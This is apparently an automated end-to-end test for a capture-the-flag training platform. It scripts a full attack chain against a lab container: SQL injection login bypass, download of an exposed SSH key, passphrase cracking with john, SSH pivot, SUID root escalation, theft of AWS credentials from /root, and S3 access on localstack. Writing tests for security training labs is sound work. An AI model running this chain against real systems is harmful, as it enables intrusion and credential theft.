import { describe, it, beforeAll, afterAll, expect } from 'vitest';
import { config } from '../config.js';
import {
  registerLearner,
  resolveSlugIds,
  pollSessionUntilRunning,
  stopSession,
} from '../lib/apiClient.js';
import { TerminalSession, extractJson } from '../lib/terminalSession.js';
import { runStage } from '../lib/stage.js';

const { networkAlias, expectedFlags } = config.chainA;

describe('Chain A — challenge-1 payments module (web -> in-container root -> cloud)', () => {
  let token;
  let ids;
  let sessionId;
  let term;

  beforeAll(async () => {
    ({ token } = await registerLearner());
    ids = await resolveSlugIds(token, config.chainA.moduleSlugs);
  });

  afterAll(async () => {
    term?.close();
    if (sessionId) {
      await stopSession(token, sessionId).catch((err) => {
        console.error(`[Chain A] teardown: DELETE session failed: ${err.message}`);
      });
    }
  }, config.timeouts.sessionRunning);

  it(
    'completes web foothold -> in-container root -> cloud abuse, capturing all six flags',
    async () => {
      const startedAt = Date.now();

      // The per-session target has no published port (docker.service.js's
      // provision()), so reachability must be checked from the workstation,
      // never from this test runner's host.
      await runStage('1: instantiate + reachability', async () => {
        const entryId = ids[config.chainA.entrySlug];
        const session = await pollSessionUntilRunning(token, entryId);
        sessionId = session.sessionId;
        expect(session.status).toBe('running');

        term = new TerminalSession();
        await term.connect({ token, sessionId, challengeIds: Object.values(ids) });

        await term.waitForOutput('ctf@chainbreak-ws', { label: "the workstation's shell prompt" });

        const reach = await term.runCommand(
          `curl -s -o /dev/null -w '%{http_code}' http://${networkAlias}:3000/health`
        );
        expect(reach.output).toContain('200');
      });

      let adminToken;
      await runStage('2: web foothold (SQLi bypass + IDOR)', async () => {
        // Sent via sendInput, not runCommand: this is a multi-line heredoc,
        // and runCommand's completion marker gets joined onto the same line
        // with `;`, which would land inside the heredoc body instead of
        // after it. The payload also contains single quotes, which a
        // quoted heredoc sidesteps without shell-quoting gymnastics.
        term.sendInput(
          `cat > /home/ctf/login.json <<'EOF'\n{"username":"admin","password":"anything' OR '1'='1"}\nEOF\n`
        );
        const writtenFile = await term.runCommand('cat /home/ctf/login.json');
        expect(writtenFile.output).toContain('anything\' OR \'1\'=\'1');

        const login = await term.runCommand(
          `curl -s -X POST http://${networkAlias}:3000/login -H 'Content-Type: application/json' --data @/home/ctf/login.json`
        );
        const loginBody = extractJson(login.output);
        expect(loginBody.success).toBe(true);
        expect(loginBody.role).toBe('admin');
        expect(loginBody.flag).toBe(expectedFlags['sqli-login']);
        adminToken = loginBody.token;
        await term.waitForFlag(ids['sqli-login']);

        const users = await term.runCommand(
          `curl -s http://${networkAlias}:3000/api/users -H 'Authorization: Bearer ${adminToken}'`
        );
        const usersBody = extractJson(users.output);
        expect(usersBody.users.length).toBeGreaterThan(0);
        expect(usersBody.flag).toBe(expectedFlags['sqli-broken-access']);
        await term.waitForFlag(ids['sqli-broken-access']);

        const manifest = await term.runCommand(
          `curl -s 'http://${networkAlias}:3000/api/admin/backup?file=README.txt' -H 'Authorization: Bearer ${adminToken}'`
        );
        const keyFileMatch = manifest.output.match(/(\S*_key\S*)/);
        expect(keyFileMatch, `Backup manifest did not name a *_key file:\n${manifest.output}`).toBeTruthy();
        const keyFile = keyFileMatch[1];

        await term.runCommand(
          `curl -s 'http://${networkAlias}:3000/api/admin/backup?file=${keyFile}' -H 'Authorization: Bearer ${adminToken}' -o /home/ctf/paymentsvc_key`
        );
        // SSH refuses a private key with group/other permission bits set,
        // and the download above lands with whatever umask curl uses.
        const chmod = await term.runCommand('chmod 600 /home/ctf/paymentsvc_key');
        expect(chmod.exitCode).toBe(0);
      });

      let awsAccessKeyId;
      let awsSecretAccessKey;
      await runStage('3: crack SSH key -> pivot -> SUID privesc to root', async () => {
        await term.runCommand('ssh2john /home/ctf/paymentsvc_key > /home/ctf/key.hash');

        await term.runCommand(
          `john --wordlist=/usr/share/wordlists/rockyou.txt /home/ctf/key.hash`,
          { timeoutMs: config.timeouts.passwordCrack }
        );
        const shown = await term.runCommand('john --show /home/ctf/key.hash');
        const crackedMatch = shown.output.match(/paymentsvc_key:(\S+)/);
        expect(crackedMatch, `john did not report a cracked passphrase:\n${shown.output}`).toBeTruthy();
        const passphrase = crackedMatch[1];

        const reencrypt = await term.runCommand(
          `ssh-keygen -p -P '${passphrase}' -N '' -f /home/ctf/paymentsvc_key`
        );
        expect(reencrypt.exitCode).toBe(0);

        // A real interactive login has no "command finished" marker of its
        // own, so it's sent raw and we wait for the new shell's prompt
        // instead of runCommand's echo-tag trick.
        term.sendInput(
          `ssh -i /home/ctf/paymentsvc_key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null paymentsvc@${networkAlias}\n`
        );
        await term.waitForOutput(`paymentsvc@${networkAlias}`, { label: 'the paymentsvc SSH login prompt' });
        const sshPivotFlag = await term.waitForFlag(ids['sqli-ssh-pivot']);
        expect(sshPivotFlag.flag).toBe(expectedFlags['sqli-ssh-pivot']);

        const whoami = await term.runCommand('whoami');
        expect(whoami.output).toContain('paymentsvc');

        term.sendInput('/usr/local/bin/backup-helper\n');
        await term.waitForOutput(`root@${networkAlias}`, { label: 'the escalated root shell prompt' });

        const id = await term.runCommand('id');
        expect(id.output).toMatch(/uid=0\(root\)/);

        const flagFile = await term.runCommand('cat /root/flag.txt');
        expect(flagFile.exitCode).toBe(0);
        expect(flagFile.output).toContain(expectedFlags['sqli-privesc-root']);
        await term.waitForFlag(ids['sqli-privesc-root']);

        const creds = await term.runCommand('cat /root/.aws/credentials');
        expect(creds.output).toContain(expectedFlags['sqli-docker-misconfig']);
        await term.waitForFlag(ids['sqli-docker-misconfig']);
        const accessKeyMatch = creds.output.match(/aws_access_key_id\s*=\s*(\S+)/);
        const secretKeyMatch = creds.output.match(/aws_secret_access_key\s*=\s*(\S+)/);
        expect(accessKeyMatch && secretKeyMatch, `Could not parse leaked AWS creds:\n${creds.output}`).toBeTruthy();
        awsAccessKeyId = accessKeyMatch[1];
        awsSecretAccessKey = secretKeyMatch[1];

        term.sendInput('exit\n');
        await term.waitForOutput(`paymentsvc@${networkAlias}`, { label: 'return to the paymentsvc shell' });
        term.sendInput('exit\n');
        await term.waitForOutput('ctf@chainbreak-ws', { label: 'return to the workstation shell' });

        const backHome = await term.runCommand('whoami');
        expect(backHome.output).toContain('ctf');
      });

      await runStage('4: cloud abuse via leaked deploy-bot creds', async () => {
        const s3 = await term.runCommand(
          `AWS_ACCESS_KEY_ID=${awsAccessKeyId} AWS_SECRET_ACCESS_KEY=${awsSecretAccessKey} AWS_DEFAULT_REGION=us-east-1 ` +
          `aws --endpoint-url=http://localstack:4566 s3 cp s3://acme-payments-backups/flag.txt -`
        );
        expect(s3.exitCode).toBe(0);
        expect(s3.output).toContain(expectedFlags['sqli-iam-exfil']);
        await term.waitForFlag(ids['sqli-iam-exfil']);
      });

      const elapsedMs = Date.now() - startedAt;
      console.log(`\n[Chain A] end-to-end wall-clock time: ${elapsedMs}ms`);
    },
    config.timeouts.chainOverall
  );
});
